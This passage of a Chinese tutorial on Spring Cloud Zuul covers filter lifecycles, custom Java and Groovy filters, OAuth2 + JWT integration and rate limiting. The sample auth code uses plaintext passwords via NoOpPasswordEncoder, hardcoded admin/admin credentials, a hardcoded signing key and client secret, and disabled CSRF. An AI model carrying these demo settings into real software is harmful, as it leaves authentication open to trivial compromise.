RequestContext.getCurrentContext().unset();} 上面的官方流程图有些问题，其中 Post Filter 抛错之后进入 Error Filter，然后再进入 Post Filter 是有失偏颇的。实际上 Post Filter 抛错分两种情况： 在 Post Filter 抛错之前，Pre、Route Filter 没有抛错，此时会进入 ZuulException 的逻辑，打印堆栈信息，然后再返回 status = 500 的 Error 信息 在 Post Filter 抛错之前，Pre、Route Filter 已有抛错，此时不会打印堆栈信息，直接返回 status = 500 的 Error 信息 也就是说，整个责任链流程终点不只是 Post Filter，还可能是 Error Filter，重新整理后的流程图 Filter 的生命周期Zuul 一共有四种不同生命周期的 Filter，分别是： pre：在 Zuul 按照映射规则路由到下级服务之前执行，如果需要对请求进行预处理，比如鉴权、限流等，都应考虑在此类 Filter 里实现 route：这类 Filter 是 Zuul 路由动作的执行者，是 Apache HttpClient 或 Netflix Ribbon 构建和发送原始 HTTP 请求的地方，目前已支持 OkHttp post：这类 Filter 是在源服务返回结果或者异常信息发生后执行的，如果需要对返回信息做一些处理，则在此类 Filter 进行处理 error：在整个生命周期内如果发生异常，则会进入 Error Filter，可做全局异常处理 在实际项目中，往往需要自实现以上类型的 Filter 来对请求链路进行处理，根据业务的需求，选取相应生命周期的 Filter 来达成目的。在 Filter 之间，通过 com.netflix.zuul.context. RequestContext 类来进行通信，内部采用 ThreadLocal 保存每个请求的一些信息，包括请求路由、错误信息、HttpServletRequest、HttpServletResponse，这使得一些操作是十分可靠的，它还扩展了 ConcurrentHashMap，目的是为了在处理过程中保存任何形式的信息。 Zuul 的原生 Filter首先官方文档提到，Zuul Server 如果使用 @EnableZuulProxy 注解搭配 Spring Boot Actuator，会多出两个管控端点，具体配置如下： 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt; 123456# 暴露所需的端点management: endpoints: web: exposure: include: health, info, routes, filters 端点 /actuator，查看截图 端点 /filters：返回当前 Zuul Server 中所有已注册生效的 Filter，查看截图 端点 /routes：返回当前 Zuul Server 中所有已生成的映射规则，加上 /details 可查看详细信息，查看截图 从端点 /filters 返回的数据可以清楚地看到所有已注册生效的 Filter 信息，包括：Filter 实现类路径、Filter 执行次序、是否被禁用、是否静态。根据返回的内容，将前面的图稍作扩展，即可得到 Zuul 内置 Filter 与生命周期的组合流程图 。 Zuul 内置了各种 Filter（见上表），以上是使用 @EnableZuulProxy 注解后注册的 Filter，如果使用 @EnableZuulServer 将缺少 PreDecorationFilter、RibbonRoutingFilter、SimpleHostRoutingFilter 这些原生 Filter。如果有特殊的业务需求，可以采取替代实现的方式，覆盖掉其原生代码，也可以釆取禁用策略，语法如下：zuul.&lt;SimpleClassName&gt;.&lt;filterType&gt;.disable=true 多级业务处理自定义 Filter在 Zuul 的 Filter 链体系中，可以把一组业务逻辑细分，然后封装到一个个紧密结合的 Filter 中，设置处理顺序，组成一组 Filter 链。这在一些业务场景下十分实用，以致除 Zuul 以外的网关中间件几乎都有类似的实现。在 Zuul 里实现自定义 Filter，只需继承 ZuulFilter 类即可，ZuulFilter 是一个抽象类，需要实现它的以下几个方法： String filterType ()：使用返回值设定 Filter 类型，可以设置为 pre、route、post、error 类型。 int filterOrder ()：使用返回值设定 Filter 执行次序 boolean shouldFilter ()：使用返回值设定该 Filter 是否执行，可以作为开关来使用 Object run ()：Filter 里面的核心执行逻辑，业务处理在此编写 在 Zuul 里自定义 Filter 的示例代码如下： 1234567891011121314151617181920212223242526272829303132import com.netflix.zuul.ZuulFilter;import com.netflix.zuul.exception.ZuulException;import org.slf4j.Logger;import org.slf4j.LoggerFactory;import static org.springframework.cloud.netflix.zuul.filters.support.FilterConstants.PRE_TYPE;public class FirstPreFilter extends ZuulFilter { private static final Logger logger = LoggerFactory.getLogger(FirstPreFilter.class); @Override public String filterType() { return PRE_TYPE; } @Override public int filterOrder() { return 0; } @Override public boolean shouldFilter() { return true; } @Override public Object run() throws ZuulException { logger.info("==&gt; first custom zuul filter"); return null; }} 12345678@Configurationpublic class CommonConfiguration { @Bean public FirstPreFilter firstPreFilter() { return new FirstPreFilter(); }} 业务处理实战Zuul 作为一个 “网关” 组件，原始的功能往往不能满足实际业务需求，为了解决这个问题，官方预留了 API，使得开发者能够实现自定义业务处理，加入 Zuul 的逻辑流程。下面模拟一个业务需求，使用 SecondPreFilter 来验证是否传入 a 参数，使用 ThirdPreFilter 来验证是否传入 b 参数，最后在 PostFilter 里边统一处理返回内容，查看流程图 ，点击下载完整的示例代码。 123456789101112131415161718192021222324252627282930313233343536373839404142public class SecondPreFilter extends ZuulFilter { private static final Logger logger = LoggerFactory.getLogger(SecondPreFilter.class); @Override public String filterType() { return PRE_TYPE; } @Override public int filterOrder() { return 2; } @Override public boolean shouldFilter() { return true; } @Override public Object run() throws ZuulException { logger.info("==&gt; second custom zuul pre filter"); //从RequestContext获取上下文 RequestContext context = RequestContext.getCurrentContext(); //从上下文获取HttpServletRequest HttpServletRequest request = context.getRequest(); //从request尝试获取a参数值 String a = request.getParameter("a"); if (null == a) { //对该请求禁止路由，也就是禁止访问下游服务 context.setSendZuulResponse(false); //保存于上下文，作为同类型下游Filter的执行开关 context.set("logic-is-success", false); //设定responseBody供PostFilter使用 context.setResponseBody("{\\"status\\":500,\\"message\\":\\"param a is null !\\"}"); return null; } //设置避免报空异常 context.set("logic-is-success", true); return null; }} 12345678910111213141516171819202122232425262728293031323334353637383940414243public class ThirdPreFilter extends ZuulFilter { private static final Logger logger = LoggerFactory.getLogger(ThirdPreFilter.class); @Override public String filterType() { return PRE_TYPE; } @Override public int filterOrder() { return 3; } @Override public boolean shouldFilter() { RequestContext context = RequestContext.getCurrentContext(); return (boolean) context.get("logic-is-success"); } @Override public Object run() throws ZuulException { logger.info("==&gt; third custom zuul pre filter"); //从RequestContext获取上下文 RequestContext context = RequestContext.getCurrentContext(); //从上下文获取HttpServletRequest HttpServletRequest request = context.getRequest(); //从request尝试获取b参数值 String b = request.getParameter("b"); if (null == b) { //对该请求禁止路由，也就是禁止访问下游服务 context.setSendZuulResponse(false); //保存于上下文，作为同类型下游Filter的执行开关，假定后续还有自定义Filter当设置此值 context.set("logic-is-success", false); //设定responseBody供PostFilter使用 context.setResponseBody("{\\"status\\":500,\\"message\\":\\"param b is null !\\"}"); return null; } //设置避免报空异常 context.set("logic-is-success", true); return null; }} 1234567891011121314151617181920212223242526272829303132333435363738public class PostFilter extends ZuulFilter { private static final Logger logger = LoggerFactory.getLogger(SecondPreFilter.class); @Override public String filterType() { return POST_TYPE; } @Override public int filterOrder() { return 0; } @Override public boolean shouldFilter() { return true; } @Override public Object run() throws ZuulException { logger.info("==&gt; custom zuul post filter"); //从RequestContext获取上下文 RequestContext context = RequestContext.getCurrentContext(); //处理返回中文乱码 context.getResponse().setCharacterEncoding("UTF-8"); //获取上下文中保存的responseBody String responseBody = context.getResponseBody(); //如果responseBody不为空，则说明流程有异常发生 if (null != responseBody) { //设定返回状态码 context.setResponseStatusCode(500); //替换响应报文 context.setResponseBody(responseBody); } return null; }} 测试效果： 依次启动 eureka-server、provider-service、zuul-server 应用 访问 http://127.0.0.1:8092/provider/service/provider/add?b=3，日志输出如下： 12SecondPreFilter : ==&gt; second custom zuul pre filterSecondPreFilter : ==&gt; custom zuul post filter 访问 http://127.0.0.1:8092/provider/service/provider/add?a=3，日志输出如下： 123SecondPreFilter : ==&gt; second custom zuul pre filterThirdPreFilter : ==&gt; third custom zuul pre filterSecondPreFilter : ==&gt; custom zuul post filter 使用 Groovy 编写 FilterGroovy 语言是基于 JVM 的一门动态语言，它结合了 Python、 Ruby 和 Smalltalk 的许多强大特性，支持无缝引入 Java 代码与 Java 库，常常被用作 Java 的扩展语言来使用。它的语法与 Java 类似，书写起来比 Java 略为简洁，是一门很优秀的语言。Zuul 中提供 Groovy 的编译类 com.netflix.zuul.groovy.GroovyCompiler，结合 com.netflix.zuul.groovy.GroovyFileFilter 类，可以使用 Groovy 来编写自定义的 Filter。也许到这里，很多开发者认为它在 Zuul 中没有存在的必要，但是当得知它可以不用编译（不用打进工程包），可以放在服务器上任意位置，可以任何时候修改由它编写的 Filter，且修改过后还不用重启服务的时候，就会知道它有多实用了。下面使用 Groovy 编写自定义 Filter 作为例子，点击下载完整的示例代码。 首先添加 Groovy 相关的依赖，需要指定 Groovy 的版本来覆盖 SpringBoot 中的 Groovy 版本，建议这里不要使用阿里云的 Maven 仓库，否则会找不到最新版本的 Groovy： 123456789101112&lt;properties&gt; &lt;groovy.version&gt;3.0.3&lt;/groovy.version&gt;&lt;/properties&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.codehaus.groovy&lt;/groupId&gt; &lt;artifactId&gt;groovy-all&lt;/artifactId&gt; &lt;version&gt;${groovy.version}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 使用 Groovy 编写自定义 Filter，并将 Groovy 的源码文件 GroovyFilter.groovy 保存在 /tmp/groovy/ 目录下： 1234567891011121314151617181920212223242526272829303132333435363738import com.netflix.zuul.ZuulFilterimport com.netflix.zuul.context.RequestContextimport com.netflix.zuul.exception.ZuulExceptionimport javax.servlet.http.HttpServletRequestimport static org.springframework.cloud.netflix.zuul.filters.support.FilterConstants.PRE_TYPEclass GroovyFilter extends ZuulFilter { @Override String filterType() { return PRE_TYPE } @Override int filterOrder() { return 10 } @Override boolean shouldFilter() { return true } @Override Object run() throws ZuulException { println("This is Groovy Filter!") HttpServletRequest request = RequestContext.currentContext.request as HttpServletRequest Iterator headerIt = request.getHeaderNames().iterator() while (headerIt.hasNext()) { String name = (String) headerIt.next() String value = request.getHeader(name) println("header: " + name + ": " + value) } return null }} 注册 GroovyFilter.groovy： 12345678910111213141516@Componentpublic class GroovyRunner implements CommandLineRunner { @Override public void run(String... args) throws Exception { MonitoringHelper.initMocks(); FilterLoader.getInstance().setCompiler(new GroovyCompiler()); try{ FilterFileManager.setFilenameFilter(new GroovyFileFilter()); // 指定Groovy源码文件的绝对路径，对路径每隔20秒扫描一次 FilterFileManager.init(20, "/tmp/groovy"); }catch(Exception e){ throw new RuntimeException(e); } }} 测试： 依次启动 eureka-server、provider-service、zuul-server 应用 访问 http://127.0.0.1:8092/provider/service/provider/add?b=3，日志输出如下： 123456This is Groovy Filter!header: host: 127.0.0.1:8092header: connection: keep-aliveheader: cache-control: max-age=0header: upgrade-insecure-requests: 1... 将 /tmp/groovy/GroovyFilter.groovy 里的 println("This is Groovy Filter!") 更改为 println("This is Groovy Filter Modify!") 等待 20 秒后，访问 http://127.0.0.1:8092/provider/service/provider/add?b=3，日志输出如下： 123456This is Groovy Filter Modify!header: host: 127.0.0.1:8092header: connection: keep-aliveheader: cache-control: max-age=0header: upgrade-insecure-requests: 1... Zuul 权限集成应用权限概述权限，是整个微服务体系乃至软件业永恒的话题，有资源的地方，就有权限约束。以往在构建单体应用的时候，比较流行的方式是使用 Apache Shiro，开发者的印象都是 Apache Shiro 比 Spring Security 上手容易，学习成本相对较小，但是到了 Spring Cloud 这里，面对成千上万的服务，而且服务之间无状态，此时 Apache Shiro 难免显得力不从心，所以 Spring Cloud 没有选择它也是有原因的。在解决方案的选择上面，传统的譬如单点登录（SSO），或者分布式 Session，要么致使权限服务器集中化导致流量臃肿，要么需要实现一套复杂的存储同步机制，都不是最好的解决方案。作为 Spring Cloud 微服务体系流量前门的 Zuul，除去与它特性毫无相关的实现方式，比较好的方式有： 自定义权限认证 Filter由于 Zuul 对请求转发全程的可控性，可以在 Requestcontext 的基础上做任何事情，例如只需要设置一个执行顺序靠前的 Filter，就可以专门对请求的特定内容做权限认证。这种方式的优点是实现灵活度高，可整合已有权限系统，对原始系统微服务化特别友好；缺点是需要开发一套新的逻辑，维护增加成本，而且也会使得调用链路变得紊乱。 OAuth2.0 + JWT 认证OAuth2.0 是业界对于 “授权 - 认证” 比较成熟的面向资源的授权协议。举个例子，除了可以使用本站用户名与密码登录 Spring Cloud 中国社区，还可以使用第三方应用登录，比如：GitHub、QQ 等登录方式。第三方登录功能对用户十分有亲和力，而 Oauth2.0 就是用于定义 Spring Cloud 中国社区与用户之间的那个 “授权层” 的。Oauth2.0 的认证原理图如下，在整个流程中，用户是资源拥有者，其关键还是在于客户端需要资源拥有者的授权，这个过程就相当于键入密码或者是其他第三方登录，触发了这个操作之后，客户端就可以向授权服务器申请 Token，拿到后再携带 Token 到资源所在服务器拉取相应资源。 JWT（JSON Web Token）是一种使用 JSON 格式来规约 Token 或者 Session 的协议。由于传统认证方式免不了会生成一个凭证，这个凭证可以是 Token 或者 Session，保存于服务端或者其他持久化工具中，这样一来，凭证的存取就变得十分麻烦，JWT 的出现打破了这一瓶颈，实现了 “客户端 Session” 的愿景。JWT 通常由三部分组成： Header 头部：指定 JWT 使用的签名算法 Payload 载荷：包含一些自定义与非自定义的认证信息 Signature 签名：将头部与载荷使用 . 连接之后，使用头部的签名算法生成签名信息并拼装到末尾 OAuth2.0 + JWT 的意义就在于，使用 0Auth2.0 协议的思想拉取认证生成 Token，使用 JWT 瞬时保存这个 Token，在客户端与资源端进行对称或非对称加密，使得这个规约具有定时、定量的授权认证功能，从而免去 Token 存储所带来的安全或系统扩展问题。 OAuth2.0 + JWT 实战下面模拟 Zuul 结合 OAuth2.0 + JWT 的实际应用，点击下载完整的示例代码。 编写 zuul-serverzuul-server 中需要做的就是当请求接口时，判断是否登录，如果未登录，则跳转到 auth-server 的登录界面（这里使用的是 Spring Security OAuth 的默认登录界面，也可以重写相关代码定制页面)，登录成功后 auth-server 颁发 jwt token，zuul-server 在访问下游服务时将 jwt token 放入 header 中即可。 zuul-server 的 pom.xml 文件： 12345678910111213141516&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-zuul&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-security&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-oauth2&lt;/artifactId&gt;&lt;/dependency&gt; zuul-server 的 application.yml 文件： 123456789101112131415161718192021222324252627282930server: port: 8092spring: application: name: zuul-servereureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: truezuul: routes: provider-service: path: /provider/service/** serviceId: provider-servicesecurity: oauth2: client: access-token-uri: http://127.0.0.1:8091/uaa/oauth/token #令牌端点 user-authorization-uri: http://127.0.0.1:8091/uaa/oauth/authorize #授权端点 client-id: zuul_server #OAuth2客户端ID client-secret: secret #OAuth2客户端密钥 resource: jwt: key-value: springcloud123 #指定密钥，使用对称加密方式，默认算法为HS256 在 zuul-server 里重写 WebSecurityConfigurerAdapter 适配器的 configure(HttpSecurity http) 方法，声明需要鉴权的 URL 信息 1234567891011121314151617@Component@EnableOAuth2Ssopublic class WebSecurityConfiguration extends WebSecurityConfigurerAdapter { @Override protected void configure(HttpSecurity http) throws Exception { http .authorizeRequests() .antMatchers("/login", "/provider/service/**") .permitAll() .anyRequest() .authenticated() .and() .csrf() .disable(); }} 编写 auth-serverauth-server 是整个示例的 另一个核心，作为认证授权中心，用于颁发 jwt token 凭证。 auth-server 的 pom.xml 文件： 12345678&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-oauth2&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt; auth-server 的 application.xml 文件： 123456789101112131415server: port: 8091 servlet: context-path: /uaaspring: application: name: auth-servereureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: true 在 auth-server 里编写认证授权服务适配类 OauthConfigruatrion，主要用于指定客户端 ID、密钥，以及权限定义与作用域声明，指定 TokenStore 为 JWT，不同于以往将 TokenStore 指定为 Redis 或是其他持久化工具： 123456789101112131415161718192021222324252627282930313233343536373839@Configuration@EnableAuthorizationServerpublic class OauthConfigruatrion extends AuthorizationServerConfigurerAdapter { @Autowired private AuthenticationManager authenticationManager; @Override public void configure(ClientDetailsServiceConfigurer clients) throws Exception { clients .inMemory() .withClient("zuul_server") .secret("secret") .scopes("WRIGTH", "read") .autoApprove(true) .authorities("WRIGTH_READ", "WRIGTH_WRITE") .authorizedGrantTypes("implicit", "refresh_token", "password", "authorization_code"); } @Override public void configure(AuthorizationServerEndpointsConfigurer endpoints) throws Exception { endpoints .tokenStore(jwtTokenStore()) .tokenEnhancer(jwtTokenConverter()) .authenticationManager(authenticationManager); } @Bean public TokenStore jwtTokenStore() { return new JwtTokenStore(jwtTokenConverter()); } @Bean protected JwtAccessTokenConverter jwtTokenConverter() { JwtAccessTokenConverter converter = new JwtAccessTokenConverter(); converter.setSigningKey("springcloud123"); return converter; }} 在 auth-server 里编写安全配置类 WebSecurityConfiguration，主要声明用户 admin 具有读写权限，用户 guest 具有读权限，passwordEncoder() 用于声明用户名和密码的加密方式，这个功能在 Spring Security 5.0 之前是没有的。 1234567891011121314151617181920212223@Configurationpublic class WebSecurityConfiguration extends WebSecurityConfigurerAdapter { @Override @Bean(name = BeanIds.AUTHENTICATION_MANAGER) public AuthenticationManager authenticationManager() throws Exception { return super.authenticationManager(); } @Override protected void configure(AuthenticationManagerBuilder auth) throws Exception { auth .inMemoryAuthentication() .withUser("guest").password("guest").authorities("WRIGTH_READ") .and() .withUser("admin").password("admin").authorities("WRIGTH_READ", "WRIGTH_WRITE"); } @Bean public static NoOpPasswordEncoder passwordEncoder() { return (NoOpPasswordEncoder) NoOpPasswordEncoder.getInstance(); }} 编写 provider-serviceprovider-service 作为 zuul-server 的下游服务，需要的功能很简单，能够被注册发现，以及能够按照规贝解析 jwt token 即可。 provider-service 的 pom.xml 文件 123456789101112&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-security&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-oauth2&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt; provider-service 的 application.yml 文件： 12345678910111213server: port: 9090spring: application: name: provider-serviceeureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: true 在 provider-service 里编写配置类 ResourceServerConfiguration： 123456789101112131415161718192021222324252627282930313233@Configuration@EnableResourceServerpublic class ResourceServerConfiguration extends ResourceServerConfigurerAdapter { @Override public void configure(HttpSecurity http) throws Exception { http .csrf().disable() .authorizeRequests() .antMatchers("/**").authenticated() .antMatchers(HttpMethod.GET, "/test") .hasAuthority("WRIGTH_READ"); } @Override public void configure(ResourceServerSecurityConfigurer resources) throws Exception { resources .resourceId("WRIGTH") .tokenStore(jwtTokenStore()); } @Bean public TokenStore jwtTokenStore() { return new JwtTokenStore(jwtTokenConverter()); } @Bean protected JwtAccessTokenConverter jwtTokenConverter() { JwtAccessTokenConverter converter = new JwtAccessTokenConverter(); converter.setSigningKey("springcloud123"); return converter; }} 在 provider-service 里编写测试类： 1234567891011121314151617@RestControllerpublic class TestController { private static final Logger logger = LoggerFactory.getLogger(TestController.class); @RequestMapping("/test") public String test(HttpServletRequest request) { logger.info("----------------header----------------"); Enumeration headerNames = request.getHeaderNames(); while (headerNames.hasMoreElements()) { String key = (String) headerNames.nextElement(); logger.info(key + ": " + request.getHeader(key)); } logger.info("----------------header----------------"); return "hello!"; }} 测试效果 在测试之前，整个示例的流程图在这里 依次启动 eureka-server、provider-service、auth-server、zuul-server 应用 访问 http://127.0.0.1:8092/provider/service/test，由于未授权，该接口会返回需要授权才能访问的提示信息，查看截图 访问 http://127.0.0.1:8092，会自动跳转到 auth-server 的默认登录页面（http://127.0.0.1:8091/uaa/login），输入用户名 admin 与 密码 admin 进行登录，查看截图 再次访问 http://127.0.0.1:8092/provider/service/test，调用接口成功，控制台的日志信息如下： 1234567891011121314151617181920----------------header----------------upgrade-insecure-requests: 1user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9sec-fetch-site: nonesec-fetch-mode: navigatesec-fetch-user: ?1sec-fetch-dest: documentaccept-language: en,zh-CN;q=0.9,zh;q=0.8authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1ODg2OTE4NzAsInVzZXJfbmFtZSI6ImFkbWluIiwiYXV0aG9yaXRpZXMiOlsiV1JJ ...x-forwarded-host: 127.0.0.1:8092x-forwarded-proto: httpx-forwarded-prefix: /provider/servicex-forwarded-port: 8092x-forwarded-for: 127.0.0.1accept-encoding: gzipcontent-length: 0host: 192.168.1.130:9090connection: Keep-Alive----------------header---------------- Zuul 限流构建一个自我修复型系统一直是各大企业进行架构设计的难点所在，在 Hystrix 中可以通过熔断器来实现，通过某个阈值来对异常流量进行降级处理。其实，除对异常流量进行降级处理之外，也可以做一些其他操作来保护系统免受 “雪崩之灾”，比如：流量 排队、限流、分流等。 限流算法说到限流算法，不自觉就想到了 “漏桶” 与 “令牌桶” 算法。诚然，两种限流的祖师级算法确有其独到之处，其他实现比如滑动时间窗或者三色速率标记法等，其实质还是 “漏桶” 与 “令牌桶” 的变种，要么是将 “漏桶” 容积换成了单位时间，要么是按规则将请求标记颜色进行处理，底层还是 “令牌” 的思想。所以，掌握 “漏桶” 与 “令牌桶” 算法原理，对理解其他限流算法有一定帮助。 漏桶（Leaky Bucket）算法漏桶的原型是一个底部有漏孔的桶，桶上方有一个入水口，水不断地流进桶内，桶下方的漏孔就会以一个相对恒定的速率漏水，在入大于岀的情况下，桶在一段时间之后就会被装满，这时候多余的水就会溢出；而在入小于出的情况下，漏桶则不起任何作用。后来将这个经典模型运用在网络流量整形上面，通过漏桶算法的约束，突发流量可以被整形为一个规整的流量（如图所示）。当请求或者具有一定体量的数据流涌来的时候，在漏桶的作用下，流量被整形，不能满足要求的部分被削减掉。所以，漏桶算法能够强制限定流量速率。注意，在企业应用中，这部分溢出的流量是可以被利用起来的，并非完全丢弃，可以把它们收集到一个队列里面，做流量排队，尽量做到合理利用所有资源。 令牌桶（Token Bucket）算法令牌桶算法和漏桶算法有点不一样，桶里面存放令牌，而令牌又是以一个恒定的速率被加入桶内，可以积压，可以溢出。当数据流涌来时，量化请求用于获取令牌，如果取到令牌则放行，同时桶内丢弃掉这个令牌；如果不能取到令牌，请求则被丢弃（如图所示）。由于令牌桶内可以存在一定数量的令牌，那么就可能存在一定程度的流量突发，这也是决定漏桶算法与令牌桶算法适用于不同应用场景的主要原因。 限流实战在 Zuul 中实现限流最简单的方式是使用自定义 Filter 加上相关限流算法，其中可能会考虑到 Zuul 的多节点部署，因为算法的原因，这时候需要一个 K/V 存储工具（推荐使用 Redis，充分利用 Redis 单线程的特性，可以有效避免多节点带来的一些问题)。当然如果 Zuul 是单节点应用，限流方式的选择就会广得多，完全可以将相关 prefix 放在内存之中，方便又快捷。这里介绍一个开箱即用的工具 spring-cloud-zuul-ratelimit，它是专门针对 Zuul 编写的限流库，提供了以下特性： 多种细粒度策略： 多种粒度临时变量存储方式： 父 Maven 工程的 pom.xml 文件，这里 Spring Cloud 的版本是 Hoxton.SR4，Spring Boot 的版本是 2.2.6.RELEASE，点击下载完整的示例代码。 1234567891011121314151617181920212223242526272829303132333435363738&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.2.6.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;!-- 利用传递依赖，公共部分 --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;!-- 管理依赖 --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Hoxton.SR4&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!--注意：这里需要添加以下配置，否则可能会有各种依赖问题 --&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt; zuul-server 里的 pom.xml 文件： 1234567891011121314151617&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-zuul&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.marcosbarbero.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-zuul-ratelimit&lt;/artifactId&gt; &lt;version&gt;2.4.0.RELEASE&lt;/version&gt;&lt;/dependency&gt; zuul-server 里的 application.yml 文件： 1234567891011121314151617181920212223242526272829303132333435server: port: 8092spring: application: name: zuul-server redis: host: 172.175.0.3 port: 6379 password:eureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: truezuul: routes: provider-service: path: /provider/service/** serviceId: provider-service ratelimit: enabled: true key-prefix: ratelimit repository: REDIS behind-proxy: true #表示代理之后 policy-list: provider-service: #单独细化到服务粒度 - limit: 2 #在一个单位时间窗口（秒）的请求数量 quota: 1 #在一个单位时间窗口（秒）的请求时间限制 refresh-interval: 3 #刷新时间（秒） type: - url #指定url粒度 zuul-server 里的启动主类： 123456789@EnableZuulProxy@EnableDiscoveryClient@SpringBootApplicationpublic class ZuulServerApplication { public static void main(String[] args) { SpringApplication.run(ZuulServerApplication.class, args); }} 测试效果： 依次启动 eureka-server、provider-service、zuul-server 应用 多次访问 http://127.0.0.1:8092/provider/service/provider/add?b=3，在时间窗阈值内访问接口时，接口会返回正确信息；一旦超限，后台会抛出 429 异常，接口返回对应的错误信息，查看截图 Zuul 动态路由动态路由概述Zuul 提供了各种映射规则的配置方式，这极大地增加了在构建应用时的选择余地，这些方式称为 “静态路由（Static Routing）”。一般来说，在微服务构建前期就已经按照业务把各种映射关系制定好了，但是在后期迭代过程中，一个复杂的系统难免经历新服务的上线过程，这个时候不能轻易停掉线上某些映射链路；那么问题就来了，Zuul 是在启动的时候将配置文件中的映射规则写入内存，要新建映射规则，只能修改了配置文件之后再重新启动 Zuul 应用。那能不能有一种方法，既能按需修改映射规则，又能使服务免于重启之痛呢？答案是有的，目前有如下两种解决方案实现 “动态路由（Dynamic Routing）”，通常采用第一种方式，这是 Spring Cloud 生态推崇的方式，但是也有它的局限性，有兴趣的读者可以查阅相关资料。 结合 Spring Cloud Config + Bus，动态刷新配置文件，这种方式的好处是不用 Zuul 维护映射规则，可以随时修改，随时生效；唯一不好的地方是需要单独集成一些使用并不频繁的组件，Config 没有可视化界面，维护起规则来也相对麻烦 重写 Zuul 的配置读取方式，釆用事件刷新机制，从数据库读取路由映射规则，此种方式因为基于数据库，可轻松实现管理界面，灵活度较高 动态路由实现原理剖析Zuul 动态路由实现的四个核心类： DiscoveryClientRouteLocator 类中的 locateRoutes() 方法继承自 SimpleRouteLocator 类并重写了规则，该方法主要的功能就是将配置文件中的映射规则信息包装成 LinkedHashMap&lt;String, ZuulRoute&gt;，键是映射路径，值是配置文件的封装类，以往所见的配置映射读取进来就是使用 ZuulRoute 来封装。refiresh() 实现自 RefreshableRouteLocator 接口，添加刷新功能必须要实现此方法，doRefresh() 方法来自 SimpleRouteLocator 类。 SimpleRouteLocator 该类是 DiscoveryClientRouteLocator 的父类，此类基本实现了 RouteLocator 接口，对读取的配置文件信息做一些基本处理，提供了方法 doRefresh() 与 locateRoutes() 供子类实现刷新策略与映射规则加载策略，两个方法都是使用 protected 修饰，是为了让子类不用维护此类一些成员变量就能够实现刷新或者读取路由的功能。 ZuulServerAutoConfiguration 在低版本的 Spring Cloud Zuul 中，这个类叫作 ZuulConfiguration，位于 org.springframework. cloud.netflix.zuul 